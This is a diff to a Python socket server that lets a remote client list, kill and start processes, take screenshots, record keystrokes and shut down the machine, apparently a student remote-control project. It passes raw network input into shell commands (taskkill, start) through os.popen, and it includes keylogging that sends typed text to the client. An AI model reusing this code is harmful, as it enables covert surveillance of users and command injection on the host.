@@ -18,17 +18,21 @@ def threaded_client(con, addr):
                 elif req == "kill":
                     con.sendall("Receive Request".encode('utf8'))
                     pId = con.recv(1024).decode('utf8')
+                    if pId == 'pid close':
+                        continue
                     os.popen('taskkill /F /PID ' + pId)
                     con.sendall("Kill process".encode('utf8'))
                 elif req == "start":
                     con.sendall("Receive Request".encode('utf8'))
                     name = con.recv(1024).decode('utf8')
+                    if name == 'name close':
+                        continue
                     os.popen('start ' + name)
                     con.sendall("start process".encode('utf8'))
                 if req == 'process closing':
                     con.sendall('Received request'.encode('utf8'))
                     break 
-        if req == 'app':
+        elif req == 'app':
             con.sendall("Receveid request".encode('utf8'))
 
             while True:
@@ -39,44 +43,50 @@ def threaded_client(con, addr):
                 elif req == "kill":
                     con.sendall("Receive Request".encode('utf8'))
                     pId = con.recv(1024).decode('utf8')
+                    if pId == 'pid close':
+                        continue
                     os.popen('taskkill /F /PID ' + pId)
                     con.sendall("Kill app".encode('utf8'))
                 elif req == "start":
                     con.sendall("Receive Request".encode('utf8'))
                     name = con.recv(1024).decode('utf8')
+                    if name == 'name close':
+                        continue
                     os.popen('start ' + name)
                     con.sendall("start app".encode('utf8'))
                 if req == 'app closing':
                     con.sendall('Received request'.encode('utf8'))
                     break
 
-        if req == "printScreen":
+        elif req == "printScreen":
             img = pyautogui.screenshot()
             img_byte_arr = io.BytesIO()
             img.save(img_byte_arr, format='PNG')
             img_byte_arr = img_byte_arr.getvalue()
             con.sendall(img_byte_arr)
 
-        if req == "keystroke":
+        elif req == "keystroke":
             con.sendall("receveived Request".encode("utf8"))
             while True:
+                str = ''
                 req = con.recv(1024).decode("utf8")
                 if req == "hook":
                     keyboard.start_recording() 
                     con.sendall("Hooked".encode("utf8"))
                 elif req == "unhook":
-                    record = keyboard.stop_recording() 
-                    string = next(keyboard.get_typed_strings(record))
-                    if string == '':
-                        string = 'nothing hook'
-                    con.sendall(string.encode("utf8"))
+                    record = keyboard.stop_recording()
+                    strlst = keyboard.get_typed_strings(record)
+                    for i in strlst:
+                        str = str + i
+                    if str == '':
+                        str = 'nothing hook'
+                    con.sendall(str.encode("utf8"))
                 elif req == 'keystroke closing':
                     con.sendall('Received request'.encode('utf8'))
                     break
-        if req == "shutdown":
-            os.system("shutdown /s")
+        elif req == "shutdown":
+            os.system("shutdown /s")    
     con.close()
-    
 
 #def start server:
 def start_server():
